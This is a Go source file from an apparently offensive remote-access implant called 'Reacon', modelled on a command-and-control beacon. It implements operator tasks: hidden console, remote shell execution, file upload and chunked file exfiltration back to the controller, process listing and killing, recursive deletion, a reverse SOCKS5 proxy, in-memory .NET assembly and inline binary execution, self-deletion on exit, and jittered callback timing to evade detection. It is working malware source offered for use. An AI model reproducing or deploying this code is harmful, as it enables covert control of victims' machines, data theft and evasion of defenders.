package services

import (
	"Reacon/pkg/commands"
	"Reacon/pkg/communication"
	"Reacon/pkg/config"
	Proxy "Reacon/pkg/services/proxy"
	"Reacon/pkg/sysinfo"
	"Reacon/pkg/utils"
	"bytes"
	"crypto/rand"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"math/big"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/shirou/gopsutil/process"
)

func HideConsole() error {
	return commands.HideConsole()
}
func ProcessDPIAware() error {
	return commands.SetProcessDPIAware()
}

// pathLen(4) | path(pathLen) | cmdLen(4) | cmd(cmdLen)
func ParseCommandShell(b []byte) (string, []byte, error) {
	buf := bytes.NewBuffer(b)
	pathLenBytes := make([]byte, 4)
	_, err := buf.Read(pathLenBytes)
	if err != nil {
		return "", nil, err
	}
	pathLen := utils.ReadInt(pathLenBytes)
	path := make([]byte, pathLen)
	_, err = buf.Read(path)
	if err != nil {
		return "", nil, err
	}

	cmdLenBytes := make([]byte, 4)
	_, err = buf.Read(cmdLenBytes)
	if err != nil {
		return "", nil, err
	}

	cmdLen := utils.ReadInt(cmdLenBytes)
	cmd := make([]byte, cmdLen)
	buf.Read(cmd)

	// 替换path中的env的路径
	envKey := strings.ReplaceAll(string(path), "%", "")
	app := os.Getenv(envKey)
	return app, cmd, nil
}

// filePathLen(4) | fileContent(filePathLen)
func ParseCommandUpload(b []byte) ([]byte, []byte) {
	buf := bytes.NewBuffer(b)
	filePathLenBytes := make([]byte, 4)
	buf.Read(filePathLenBytes)
	filePathLen := utils.ReadInt(filePathLenBytes)
	filePath := make([]byte, filePathLen)
	buf.Read(filePath)
	fileContent := buf.Bytes()
	return filePath, fileContent

}
func CmdShell(cmdBuf []byte) ([]byte, error) {
	//shellPath, shellBuf, err := ParseCommandShell(cmdBuf)
	//if err != nil {
	//	return nil, err
	//}
	go func() {
		_, err := commands.Shell("", cmdBuf)
		if err != nil {
			communication.ErrorProcess(err)
		}
		return
	}()
	return []byte("[+] command is executing"), nil
}

func CmdUpload(cmdBuf []byte, isStart bool) ([]byte, error) {
	filePath, fileData := ParseCommandUpload(cmdBuf)
	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
	_, err := Upload(filePathStr, fileData, isStart)
	if err != nil {
		return nil, err
	}
	return []byte("[+] " + filePathStr + " file upload " + strconv.Itoa(len(fileData)) + " bytes."), nil
}

func Upload(filePath string, fileContent []byte, isStart bool) (int, error) {
	var fp *os.File
	var err error
	if isStart {
		// if file exist, need user delete it manually before upload
		fp, err = os.OpenFile(filePath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, os.ModePerm)
	} else {
		fp, err = os.OpenFile(filePath, os.O_APPEND|os.O_WRONLY, os.ModePerm)
	}
	if err != nil {
		return 0, errors.New("file create err: " + err.Error())
	}
	defer fp.Close()
	offset, err := fp.Write(fileContent)
	if err != nil {
		return 0, errors.New("file write err: " + err.Error())
	}
	return offset, nil
}

// requestID || fileLen || filePath
// requestID || fileContent
func CmdDownload(cmdBuf []byte) ([]byte, error) {
	filePath := cmdBuf
	strFilePath := string(filePath)
	filePathLenBytes := utils.WriteInt(len(filePath))
	strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
	go func() {
		fileInfo, err := os.Stat(strFilePath)
		if err != nil {
			communication.ErrorProcess(err)
			return
		}
		fileLen := fileInfo.Size()
		test := int(fileLen)
		fileLenBytes := utils.WriteInt(test)
		result := utils.BytesCombine(fileLenBytes, filePath)
		communication.DataProcess(22, result)

		fileHandle, err := os.Open(strFilePath)
		if err != nil {
			communication.ErrorProcess(err)
			return
		}
		var fileContent []byte
		fileBuf := make([]byte, 2000000)
		for {
			n, err := fileHandle.Read(fileBuf)
			if err != nil && err != io.EOF {
				break
			}
			if n == 0 {
				break
			}
			fileContent = fileBuf[:n]
			result = utils.BytesCombine(filePathLenBytes, filePath, fileContent)
			communication.DataProcess(DOWNLOAD, result)
			time.Sleep(50 * time.Millisecond)
		}
		communication.DataProcess(0, []byte("[+] "+strFilePath+" download success"))
	}()

	return []byte("[+] Downloading " + strFilePath), nil
}

// pendingRequest(4) || dirPathLen(4) || dirPath(dirPathLen)
func CmdFileBrowse(dirPathBytes []byte) ([]byte, error) {

	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	// build string for result
	/*
	   /Users/xxxx/Desktop/dev/deacon/*
	   D       0       25/07/2020 09:50:23     .
	   D       0       25/07/2020 09:50:23     ..
	   D       0       09/06/2020 00:55:03     cmd
	   D       0       20/06/2020 09:00:52     obj
	   D       0       18/06/2020 09:51:04     Util
	   D       0       09/06/2020 00:54:59     bin
	   D       0       18/06/2020 05:15:12     config
	   D       0       18/06/2020 13:48:07     crypt
	   D       0       18/06/2020 06:11:19     Sysinfo
	   D       0       18/06/2020 04:30:15     .vscode
	   D       0       19/06/2020 06:31:58     packet
	   F       272     20/06/2020 08:52:42     deacon.csproj
	   F       6106    26/07/2020 04:08:54     Program.cs
	*/
	fileInfo, err := os.Stat(dirPathStr)
	if err != nil {
		return nil, err
	}
	modTime := fileInfo.ModTime()
	currentDir := fileInfo.Name()

	absCurrentDir, err := filepath.Abs(currentDir)
	if err != nil {
		return nil, err
	}
	modTimeStr := modTime.Format("2006/01/02 15:04:05")
	resultStr := ""
	if dirPathStr == "./" {
		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
	} else {
		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
	}
	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
	files, err := ioutil.ReadDir(dirPathStr)
	for _, file := range files {
		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")

		if file.IsDir() {
			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
		} else {
			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
		}
	}

	return []byte(resultStr), nil

}

// filepath
func CmdCd(cmdBuf []byte) ([]byte, error) {
	err := os.Chdir(string(cmdBuf))
	if err != nil {
		return nil, err
	}
	return []byte("changing directory success"), nil
}

// ms(4)
func CmdSleep(cmdBuf []byte) ([]byte, error) {
	sleep := utils.ReadInt(cmdBuf[:4])
	if sleep != 'd' {
		config.WaitTime = time.Duration(sleep) * time.Millisecond
		return []byte("Sleep time changes to " + strconv.Itoa(int(sleep)/1000) + " seconds"), nil
	}
	return nil, nil
}

func CmdPwd() ([]byte, error) {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		return nil, err
	}
	return []byte(result), nil
}

func CmdPause(cmdBuf []byte) ([]byte, error) {
	pauseTime := utils.ReadInt(cmdBuf)
	fmt.Println(fmt.Sprintf("Pause time: %d", pauseTime))
	time.Sleep(time.Duration(pauseTime) * time.Millisecond)
	return []byte(fmt.Sprintf("Pause for %d millisecond", pauseTime)), nil
}

func CmdExit() ([]byte, error) {
	_, err := commands.DeleteSelf()
	if err != nil {
		return nil, err
	}
	return []byte("success exit"), nil
}

func CmdExecute(cmdBuf []byte) ([]byte, error) {
	return commands.Execute(cmdBuf)
}

func CmdPs() ([]byte, error) {
	/*err := enableSeDebugPrivilege()
	if err != nil {
		fmt.Println("SeDebugPrivilege Wrong.")
	}*/

	processes, err := process.Processes()
	if err != nil {
		return nil, err
	}
	result := fmt.Sprintf("\n%s\t\t\t%s\t\t\t%s\t\t\t%s\t\t\t%s", "Process Name", "pPid", "pid", "Arch", "User")
	for _, p := range processes {
		pid := p.Pid
		parent, _ := p.Parent()
		if parent == nil {
			continue
		}
		pPid := parent.Pid
		name, _ := p.Name()
		owner, _ := p.Username()
		sessionId := sysinfo.GetProcessSessionId(pid)
		var arc bool
		var archString string
		IsX64, err := sysinfo.IsPidX64(uint32(pid))
		if err != nil {
			return nil, err
		}
		if arc == IsX64 {
			archString = "x64"
		} else {
			archString = "x86"
		}

		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
	}

	//return append(b,[]byte(result)...)
	//return []byte(result), nil
	return []byte(result), nil
}

func CmdKill(cmdBuf []byte) ([]byte, error) {
	pid := utils.ReadInt(cmdBuf[:4])
	return commands.KillProcess(pid)
}

func CmdMkdir(cmdBuf []byte) ([]byte, error) {
	if PathExists(string(cmdBuf)) {
		return nil, errors.New("Directory exists")
	}
	err := os.Mkdir(string(cmdBuf), os.ModePerm)
	if err != nil {
		return nil, errors.New("Mkdir failed")
	}
	return []byte("Mkdir success: " + string(cmdBuf)), nil
}

func PathExists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return false
}

func CmdDrives() ([]byte, error) {
	return commands.Drives()
}

func CmdRm(cmdBuf []byte) ([]byte, error) {
	Path := strings.ReplaceAll(string(cmdBuf), "\\", "/")
	err := os.RemoveAll(Path)
	if err != nil {
		return nil, errors.New("Remove failed")
	}
	return []byte("Remove " + string(cmdBuf) + " success"), nil
}

func CmdCp(cmdBuf []byte) ([]byte, error) {
	buf := bytes.NewBuffer(cmdBuf)
	arg, err := utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	src := string(arg)
	arg, err = utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	dest := string(arg)
	bytesRead, err := ioutil.ReadFile(src)
	if err != nil {
		return nil, err
	}
	fp, err := os.OpenFile(dest, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return nil, err
	}
	defer fp.Close()
	_, err = fp.Write(bytesRead)
	if err != nil {
		return nil, err
	}

	return []byte("Copy " + src + " to " + dest + " success"), nil
}

func CmdMv(cmdBuf []byte) ([]byte, error) {
	buf := bytes.NewBuffer(cmdBuf)
	arg, err := utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	src := string(arg)
	arg, err = utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	dest := string(arg)
	err = os.Rename(src, dest)
	if err != nil {
		return nil, err
	}

	return []byte("Move " + src + " to " + dest + " success"), nil
}
func CallbackTime() (time.Duration, error) {
	waitTime := config.WaitTime.Milliseconds()
	jitter := int64(8)
	if jitter <= 0 || jitter > 100 {
		return config.WaitTime, nil
	}
	result, err := rand.Int(rand.Reader, big.NewInt(2*waitTime/100*jitter))
	if err != nil {
		return config.WaitTime, err
	}
	waitTime = result.Int64() + waitTime - waitTime/100*jitter
	return time.Duration(waitTime) * time.Millisecond, nil
}
func GetFileContent(cmdBuf []byte) ([]byte, error) {
	filePathLen := len(cmdBuf)
	fileLenBytes := utils.WriteInt(filePathLen)

	filePath := string(cmdBuf)
	_, err := os.Stat(string(cmdBuf))
	if err != nil {
		communication.ErrorProcess(err)
		return nil, err
	}

	// 打开文件
	file, err := os.Open(filePath)
	if err != nil {
		communication.ErrorProcess(err)
		return nil, err
	}
	defer file.Close()

	buffer := make([]byte, 10000)

	// 读取前 10000 字节的内容
	n, err := file.Read(buffer)
	if err != nil {
		communication.ErrorProcess(err)
		return nil, err
	}

	result := utils.BytesCombine(fileLenBytes, cmdBuf, buffer[:n])
	communication.DataProcess(FileContent, result)

	return []byte("reading file" + filePath), nil

}
func SocksConnect(cmdBuf []byte) ([]byte, error) {
	go Proxy.ReverseSocksAgent(string(cmdBuf), "psk", false)
	return []byte("Start socks5 proxy"), nil
}
func SocksClose() ([]byte, error) {
	Proxy.Session.Close()
	return []byte("Stop socks5 proxy"), nil
}

// len(file) || file || args
func Execute_Assembly(b []byte) ([]byte, error) {
	buf := bytes.NewBuffer(b)
	fileLenBytes := make([]byte, 4)
	buf.Read(fileLenBytes)
	fileLen := utils.ReadInt(fileLenBytes)
	fileContent := make([]byte, fileLen)
	buf.Read(fileContent)
	args := buf.String()
	if args == "<nil>" {
		args = ""
	}

	result, err := commands.ExecuteAssembly(fileContent, args)
	return result, err

}

func Inline_bin(b []byte) ([]byte, error) {
	commands.Inline_Bin(b)
	return nil, nil
}
